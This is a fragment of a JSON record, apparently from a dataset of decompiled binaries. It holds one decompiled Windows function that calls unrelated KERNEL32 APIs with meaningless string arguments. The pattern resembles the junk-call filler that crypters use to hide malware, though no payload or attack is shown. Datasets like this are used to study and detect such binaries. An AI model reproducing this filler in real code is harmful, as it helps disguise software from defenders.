        "decompiled_code": "\nvoid __cdecl fcn.0043a78b(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint var_1408h;\n    uint var_1404h;\n    uint var_1400h;\n    uint var_c00h;\n    uint var_800h;\n    uint uStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    char *pcStack88;\n    char *pcStack84;\n    char *pcStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    char *pcStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint *puStack40;\n    uint uStack36;\n    uint *puStack32;\n    uint uStack28;\n    uint *puStack24;\n    uint uStack20;\n    char *pcStack16;\n    char *pcStack12;\n    char *pcStack8;\n    \n    pcStack8 = 0x43a798;\n    fcn.0043cbd0();\n    pcStack8 = \"Bado\";\n    pcStack12 = \"Cizuzuyoyo riyijituheme\";\n    pcStack16 = \"Lukuyeyofe wulacadikapiwi foxe\";\n    uStack20 = 0x43a7ad;\n    (*_sym.imp.KERNEL32.dll_WriteProfileStringA)();\n    uStack20 = 0;\n    puStack24 = &fcn.0043a78b::var_1408h;\n    uStack28 = 0;\n    puStack32 = &fcn.0043a78b::var_1400h;\n    uStack36 = 0;\n    puStack40 = 0x43a7c7;\n    (*_sym.imp.KERNEL32.dll_ReadConsoleA)();\n    puStack40 = &fcn.0043a78b::var_1404h;\n    uStack44 = 0;\n    puStack48 = &fcn.0043a78b::var_c00h;\n    pcStack52 = \"Buxanuye zodawadi fa zura fifugecobi\";\n    uStack56 = 0x43a7e2;\n    (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameA)();\n    uStack56 = 0;\n    uStack60 = 0;\n    uStack64 = 0;\n    uStack68 = 0x43a7ee;\n    (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n    uStack68 = 0;\n    uStack72 = 0;\n    uStack76 = 0;\n    pcStack80 = \"Birona\";\n    pcStack84 = \"Zativufa xibewoye\";\n    pcStack88 = \"Wuyabeyo\";\n    uStack92 = 0x43a809;\n    (*_sym.imp.KERNEL32.dll_ReplaceFileA)();\n    uStack92 = 0;\n    uStack96 = 0x43a811;\n    (*_sym.imp.KERNEL32.dll_HeapUnlock)();\n    uStack96 = 0;\n    uStack100 = 0;\n    uStack104 = 0x43a81b;\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)();\n    uStack104 = 0x43a821;\n    (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n    uStack104 = 0;\n    puStack108 = &fcn.0043a78b::var_800h;\n    uStack112 = 0x43a830;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)();\n    uStack112 = 0x453f78;\n    uStack116 = 0x43a83b;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    *arg_8h = uVar1;\n    return;\n}\n",
        "token_count": 885
    }
}